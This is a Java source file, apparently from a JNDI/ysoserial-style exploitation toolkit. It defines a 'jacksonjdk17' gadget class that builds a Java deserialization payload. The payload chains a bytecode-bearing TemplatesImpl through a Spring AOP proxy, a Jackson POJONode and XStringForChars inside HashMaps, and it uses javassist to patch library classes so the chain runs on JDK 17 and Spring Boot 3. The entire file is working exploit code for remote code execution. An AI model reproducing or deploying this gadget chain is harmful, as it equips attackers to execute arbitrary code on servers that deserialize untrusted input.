package com.qi4l.jndi.gadgets;


import com.fasterxml.jackson.databind.node.POJONode;
import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.CtMethod;
import javassist.bytecode.ClassFile;
import org.springframework.aop.framework.AdvisedSupport;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;

import static com.qi4l.jndi.Starter.JYsoMode;

@Authors({"Unam4"})
public class jacksonjdk17 implements ObjectPayload<Object>{
    public static Object makeTemplatesImplAopProxy(Object templates) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(new Class[] { AdvisedSupport.class });
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)constructor.newInstance(new Object[] { advisedSupport });
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[] { Templates.class }, handler);
        return proxy;
    }

    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        if (Config.SPRINGBOOT3){
            IsSpringboot3();
        }
        final Object template;
        if (JYsoMode.contains("yso")) {
            template = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            template = Gadgets.createTemplatesImpl(type, param);
        }
//        String cmd = "";
//        if (command.contains("_")) {
//            String[] s = command.split("_");
//            cmd = s[0];
//            if (s[1].equals("springboot3"))
//                IsSpringboot3();
//        } else {
//            cmd = command;
//        }
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();
        POJONode node = new POJONode(makeTemplatesImplAopProxy(template));
        Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
        Object xString = Reflections.createWithoutConstructor(aClass1);
        Reflections.setFieldValue(xString, "m_obj", new char[0]);
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        hashMap1.put("zZ", xString);
        hashMap1.put("yy", node);
        hashMap2.put("yy", xString);
        hashMap2.put("zZ", node);
        HashMap map = Gadgets.makeMap(hashMap1, hashMap2);
        return map;
    }

    private void IsSpringboot3() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("org.springframework.aop.framework.DefaultAdvisorChainFactory");
        if (ctClass.isFrozen())
            ctClass.defrost();
        try {
            CtField field = ctClass.getDeclaredField("serialVersionUID");
            ctClass.removeField(field);
            CtField make = CtField.make("private static final long serialVersionUID = 273003553246259276;", ctClass);
            ctClass.addField(make);
        } catch (Exception e) {
            CtField make = CtField.make("private static final long serialVersionUID = 273003553246259276;", ctClass);
            ctClass.addField(make);
        }
        ctClass.toClass();
        ctClass.defrost();
    }
}
